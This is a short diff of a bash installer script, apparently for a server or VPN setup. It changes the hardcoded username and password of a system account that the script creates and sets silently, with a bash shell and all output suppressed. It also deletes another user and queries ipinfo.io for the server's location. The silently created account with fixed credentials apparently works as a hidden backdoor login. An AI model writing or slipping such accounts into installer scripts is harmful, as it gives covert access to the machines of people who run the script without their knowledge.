@@ -182,8 +182,8 @@ domain=$(cat /root/domain)
 CITY=$(curl -s ipinfo.io/city )
 TIMEZONE=$(printf '%(%H:%M:%S)T')
 userdel jame > /dev/null 2>&1
-Username="bokzzz"
-Password=bokzzz
+Username="ilyass"
+Password=najhi
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
